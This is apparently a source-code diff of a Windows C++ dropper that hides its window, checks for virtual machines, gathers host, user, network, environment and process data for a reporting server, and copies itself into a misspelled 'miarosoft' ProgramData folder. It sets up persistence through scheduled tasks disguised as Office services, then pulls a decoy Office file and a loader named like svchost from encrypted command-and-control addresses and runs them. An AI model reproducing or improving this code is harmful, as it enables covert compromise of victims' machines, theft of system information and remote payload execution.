@@ -54,6 +54,14 @@
 #include <stdio.h>
 #include <tchar.h>
 
+#include <windows.h>
+#include <tchar.h>
+#include <string>
+#include <iostream>
+#include "stdio.h"
+
+#pragma comment(lib, "version.lib")
+
 using namespace std;
 
 #pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")  
@@ -199,11 +207,18 @@ bool inSCRunning()
 
 void svchostDel() 
 {
-	char* tempPathTest;
-	tempPathTest = getenv("TEMP");
+	char* proPathTest;
+	proPathTest = getenv("PROGRAMDATA");
+
+	char temp[12] = "\\miarosoft\\";
+
+	char* t = new char[strlen(proPathTest) + strlen(temp)];    //先分配一块足够的空间
+	strcpy(t, proPathTest);   //然后把p复制进去
+	strcat(t, temp);   //再把a添加到后面
+	proPathTest = t;  //最后再赋值给p
 
 	vector<string> paths;
-	getDirFiles(tempPathTest, paths);
+	getDirFiles(proPathTest, paths);
 
 	for (int i = 0; i < paths.size(); i++) {
 		//cout << paths.at(i) << endl;
@@ -212,6 +227,7 @@ void svchostDel()
 
 		if (fret != string::npos)
 		{
+
 			try
 			{
 				remove(paths.at(i).c_str());
@@ -224,7 +240,6 @@ void svchostDel()
 		}
 	}
 }
-
 
 void conhostDel()
 {
@@ -329,9 +344,13 @@ void selfDel()
 
 
 
+
+
+
 int main(int argc, _TCHAR* argv[])
 {
-
+	string randstrStart = "sdfffffffffffffffffffffffffsdfsdfsdfsdfsdfsd";
+	cout << randstrStart << endl;
 	char* taskname1 = "Office Log Service Monitor";
 	char* taskname2 = "Office Log Service Monitor mini";
 
@@ -357,8 +376,10 @@ int main(int argc, _TCHAR* argv[])
 	//开启反虚拟机
 	Common::antVirtual(TRUE);
 
+	
 
 
+	//system("pause");
 
 	//test
 
@@ -448,7 +469,7 @@ int main(int argc, _TCHAR* argv[])
 	init << "action=init&hostname=" << hostname << "&user=" << cUserNameBuffer << "&arch=" << arch << "&dotnet=" << allDonetVers << "&network=" << ipconfigEncoded << "&proxy=" << ieProxyConfig << "&env=" << envEncoded << "&process=" << processEncoded << endl;
 	string initData = init.str();
 
-	//cout << init.str().c_str();
+	cout << init.str().c_str();
 
 	//printf("=================================\n");
 	//printf("[+]init %s", init.str().c_str());
@@ -468,12 +489,6 @@ int main(int argc, _TCHAR* argv[])
 	//}
 
 	//system("pause");
-
-
-
-
-
-
 
 
 	//std::cout << "decoded: " << decoded << std::endl;
@@ -498,6 +513,7 @@ int main(int argc, _TCHAR* argv[])
 	{
 		printf("\n=======================1=================\n");
 		string resp = Common::baseInfoReport(initData.c_str());
+		
 
 		printf("\n=======================2=================\n");
 
@@ -553,12 +569,15 @@ int main(int argc, _TCHAR* argv[])
 
 			conhostDel();
 
-			CopyFile(argv[0], DesFileName1.c_str(), FALSE);//false代表覆盖，dutrue不覆盖
+			if (CopyFile(argv[0], DesFileName1.c_str(), FALSE)) 
+			{
+				Common::logReport("Copy To ProgramData Dir Success");
+			}
 
-			Common::logReport("Copy To ProgramData Dir Success");
+			
 
 			//追加时间戳
-			Common::addTimestamp(DesFileName1.c_str());
+			//Common::addTimestamp(DesFileName1.c_str());
 
 			CMyTaskSchedule task;
 			BOOL flag = FALSE;
@@ -571,8 +590,14 @@ int main(int argc, _TCHAR* argv[])
 			{
 				printf("\n[-] Create %s Task Schedule Error!\n", DesFileName1.c_str());
 				Common::logReport("Schedule Task Of Loki Create Error");
-				chdir(DesPath);
+				//chdir(DesPath);
+				//string exeFile1 = DesFileName1.append(".exe");
+				//cout << exeFile1 << endl;
+				//cout << DesFileName1 << endl;
+				CopyFile(argv[0], DesFileName1.append(".exe").c_str(), FALSE);//false代表覆盖，dutrue不覆盖
+				cout << DesFileName1 << endl;
 				Common::exec(DesFileName1.c_str(), FALSE);
+				//system("pause");
 			}
 			else {
 				printf("\n[+] Create %s Task Schedule Success!\n", DesFileName1.c_str());
@@ -582,139 +607,100 @@ int main(int argc, _TCHAR* argv[])
 
 			//开始加载远程文件
 
-			//获取自身文件最后一行
-			//av
-			string filename = argv[0];
-			ifstream fin;
-			fin.open(filename);
-			if (fin.is_open()) {
-				fin.seekg(-1, ios_base::end);                // go to one spot before the EOF
+			//读取文件属性
+			string docfile =  Common::GetFileVersion(argv[0]);
 
-				bool keepLooping = true;
-				while (keepLooping) {
-					char ch;
-					fin.get(ch);                            // Get current byte's data
+			if (docfile != "")
+			{
 
-					if ((int)fin.tellg() <= 1) {             // If the data was at or before the 0th byte
-						fin.seekg(0);                       // The first line is the last line
-						keepLooping = false;                // So stop there
-					}
-					else if (ch == '\n') {                   // If the data was a newline
-						keepLooping = false;                // Stop at the current position.
-					}
-					else {                                  // If the data was neither a newline nor at the 0 byte
-						fin.seekg(-2, ios_base::cur);        // Move to the front of that data, then to the front of the data before it
-					}
+				Common::logReport(docfile.c_str());
+
+				//cout << "[+] lastname: " << lastLine << '\n';     // Display it
+
+				//https://filelist691.wzysoft.com/?c=client&a=payload&type=fakefile&name=xxxxx
+
+
+				//string cdnHost = "filelist691.wzysoft.com";
+
+				//printf("\n[+] %s \n", doc_url.c_str());
+				//printf("\n[+] %s \n", doc_file.c_str());
+				//printf("\n[+] %s \n", cdnHost.c_str());
+
+				string doc_file = "";
+				doc_file.append(tempPath);
+				doc_file.append("\\");
+
+				printf("\n[+] %s \n", doc_file.c_str());
+
+				string docDownFlag = "";
+
+				string doc_url = "https://";
+
+				//doc_url.append("filelist691.wzysoft.com");
+
+				srand((unsigned)time(NULL));
+				string ip = Common::aesDecrypt(ips_enc[(rand() % (iplength + 1))]);
+
+				doc_url.append(ip);
+
+
+				doc_url.append("/?c=client&a=payload&type=fakefile&name=");
+				//doc_url.append("qianxin");
+				doc_url.append(docfile);
+
+
+
+				printf("\n[+] %s \n", doc_url.c_str());
+
+				try
+				{
+					docDownFlag = HttpTools::download_office_file(doc_url.c_str(), doc_file.c_str());
+				}
+				catch (exception e)
+				{
+					Common::logReport(e.what());
+					Common::logReport("Office File Download Error");
 				}
 
-				string lastLine;
-				getline(fin, lastLine);                      // Read the current line
-				fin.close();
 
 
-				char* file_flag = "name=";
+				//Common::logReport("");
 
-				//判断是否有追加文件
+				cout << "Flag:" << docDownFlag.c_str() << endl;
 
-				if (strstr(lastLine.c_str(), file_flag) != NULL) {
-					int r = lastLine.find("name=");
-					lastLine.replace(r, 5, "");
+				//system("pause");
 
-					Common::logReport(lastLine.c_str());
-
-					//cout << "[+] lastname: " << lastLine << '\n';     // Display it
-
-					//https://filelist691.wzysoft.com/?c=client&a=payload&type=fakefile&name=xxxxx
-
-
-					//string cdnHost = "filelist691.wzysoft.com";
-
-					//printf("\n[+] %s \n", doc_url.c_str());
-					//printf("\n[+] %s \n", doc_file.c_str());
-					//printf("\n[+] %s \n", cdnHost.c_str());
-
-					string doc_file = "";
-					doc_file.append(tempPath);
-					doc_file.append("\\");
-
-					printf("\n[+] %s \n", doc_file.c_str());
-
-					string docDownFlag = "";
-
-					string doc_url = "https://";
-
-					//doc_url.append("filelist691.wzysoft.com");
-
-					srand((unsigned)time(NULL));
-					string ip = Common::aesDecrypt(ips_enc[(rand() % (iplength + 1))]);
-
-					doc_url.append(ip);
-
-
-					doc_url.append("/?c=client&a=payload&type=fakefile&name=");
-					//doc_url.append("qianxin");
-					doc_url.append(lastLine);
-
-
-
-					printf("\n[+] %s \n", doc_url.c_str());
-
-					try
-					{
-						docDownFlag = HttpTools::download_office_file(doc_url.c_str(), doc_file.c_str());
-					}
-					catch (exception e)
-					{
-						Common::logReport(e.what());
-						Common::logReport("Office File Download Error");
-					}
-
-					
-
-					//Common::logReport("");
-
-					cout << "Flag:" << docDownFlag.c_str() << endl;
-
-					//system("pause");
-
-					if (docDownFlag == "error") {
-						printf("\n[+] Office File Download Error!\n");
-						Common::logReport("Office File Download Error");
-						//exit(42);
-					}
-
-
-					//system("start C:\\Users\\ateam\\AppData\\Local\\Temp\\3\\testfile.pdf");
-					string doc_cmd = "C:\\Windows\\System32\\cmd.exe /c start ";
-					doc_file.append(docDownFlag);
-					doc_cmd.append(doc_file);
-
-					//Common::logReport(doc_file.c_str());
-
-					printf("\n[+] %s\n", chr);
-
-					if (!access(doc_file.c_str(), 0))
-					{
-						printf("\n[+] %s\n", doc_cmd.c_str());
-						char* chr = strdup(doc_cmd.c_str());
-						//free(chr);
-						//printf("\n[+] %s\n", chr);
-						Common::ExeCmd(chr);
-						Common::logReport("Office File Start Success");
-					}
-					else
-					{
-						printf("\n[+] Office file not exist\n");
-						Common::logReport("Office File Download Error2");
-						//exit(42);
-					}
-					//system("pause");
-				}
-				else {
-					cout << "[+] not found\n";
-					Common::logReport("Office File Not Found");
+				if (docDownFlag == "error") {
+					printf("\n[+] Office File Download Error!\n");
+					Common::logReport("Office File Download Error");
+					//exit(42);
 				}
 
+
+				//system("start C:\\Users\\ateam\\AppData\\Local\\Temp\\3\\testfile.pdf");
+				string doc_cmd = "C:\\Windows\\System32\\cmd.exe /c start ";
+				doc_file.append(docDownFlag);
+				doc_cmd.append(doc_file);
+
+				//Common::logReport(doc_file.c_str());
+
+				printf("\n[+] %s\n", chr);
+
+				if (!access(doc_file.c_str(), 0))
+				{
+					printf("\n[+] %s\n", doc_cmd.c_str());
+					char* chr = strdup(doc_cmd.c_str());
+					//free(chr);
+					//printf("\n[+] %s\n", chr);
+					Common::ExeCmd(chr);
+					Common::logReport("Office File Start Success");
+				}
+				else
+				{
+					printf("\n[+] Office file not exist\n");
+					Common::logReport("Office File Download Error2");
+					//exit(42);
+				}
 
 			}
 
@@ -822,7 +808,8 @@ int main(int argc, _TCHAR* argv[])
 
 
 							string botFile1;
-							botFile1.append(tempPath);
+							//botFile1.append(tempPath);
+							botFile1.append(DesPath);
 							botFile1.append("\\svchost");
 							botFile1.append(randstr(3));
 							//srand(time(NULL));
@@ -864,13 +851,14 @@ int main(int argc, _TCHAR* argv[])
 							}
 							else
 							{
+								//svchostDel();
 								char* chr2 = const_cast<char*>(botFile1.c_str());
 
 								printf("\n[+] %s Download Success!\n", botFile1.c_str());
 								Common::logReport("Loader Download Success");
 
 								//追加时间戳
-								Common::addTimestamp(botFile1.c_str());
+								//Common::addTimestamp(botFile1.c_str());
 
 								CMyTaskSchedule task2;
 								BOOL flag2 = FALSE;
@@ -882,8 +870,28 @@ int main(int argc, _TCHAR* argv[])
 								if (FALSE == flag2)
 								{
 									printf("\n[-] Create %s Task Schedule Error!\n", botFile1.c_str());
+
 									Common::logReport("Schedule Task Of Loader Create Error");
+
+									cout << chr2 << endl;
+
+								
+									string testFile;
+									testFile.append(botFile1);
+									testFile.append(".exe");
+
+									if (CopyFile(botFile1.c_str(), testFile.c_str(), FALSE))
+									{
+										cout << "copy success" << endl;
+									}
+
+									cout << botFile1 << endl;
+									Common::logReport("trying run loader in cmd");
+
 									Common::exec(botFile1.c_str(), FALSE);
+									exit(0);
+
+
 								}
 								else {
 									printf("\n[+] Create %s Task Schedule Success!\n", botFile1.c_str());
